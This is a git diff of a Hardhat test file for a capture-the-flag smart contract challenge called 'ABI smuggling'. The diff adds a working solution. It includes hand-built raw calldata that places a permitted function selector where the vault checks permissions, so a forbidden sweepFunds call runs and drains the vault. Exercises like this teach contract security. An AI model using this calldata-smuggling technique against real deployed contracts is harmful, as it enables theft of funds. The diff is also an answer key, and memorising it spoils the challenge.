@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { time } = require("@nomicfoundation/hardhat-network-helpers");
+
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
@@ -19,8 +21,9 @@ describe('[Challenge] ABI smuggling', function () {
         expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);
 
         // Set permissions
-        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
-        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
+        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address); // sweepFunds(address,address)
+        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address); // withdraw(address,address,uint256)
+
         await vault.setPermissions([deployerPermission, playerPermission]);
         expect(await vault.permissions(deployerPermission)).to.be.true;
         expect(await vault.permissions(playerPermission)).to.be.true;
@@ -44,7 +47,41 @@ describe('[Challenge] ABI smuggling', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // sig: function withdraw(address token, address recipient, uint256 amount) external
+        const withdrawCalldata = vault.interface.encodeFunctionData("withdraw", [token.address, player.address, 1000000n * 10n ** 18n]);
+
+        // sig: function sweepFunds(address receiver, IERC20 token) external
+        const sweepFundsCalldata = vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+        console.log("sweepFundsCalldata = ", sweepFundsCalldata);
+
+        // sig: function execute(address target, bytes calldata actionData)
+        const executeCalldata = vault.interface.encodeFunctionData("execute", [vault.address, withdrawCalldata]);
+        console.log("executeCalldata = ", executeCalldata);
+
+        console.log("vault.address = ", vault.address);
+        
+        /*
+        0x
+        1cff79cd
+        000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
+        0000000000000000000000000000000000000000000000000000000000000064
+        0000000000000000000000000000000000000000000000000000000000000000
+        d9caed12
+        0000000000000000000000000000000000000000000000000000000000000044
+        85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
+
+
+        0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
+        00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c8
+        00000000000000000000000000000000000000000000d3c21bcecceda1000000
+        00000000000000000000000000000000000000000000000000000000
+        */
+
+        await player.sendTransaction({
+            to: vault.address,
+            data: "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000000d9caed12000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3"
+        });
+        
     });
 
     after(async function () {
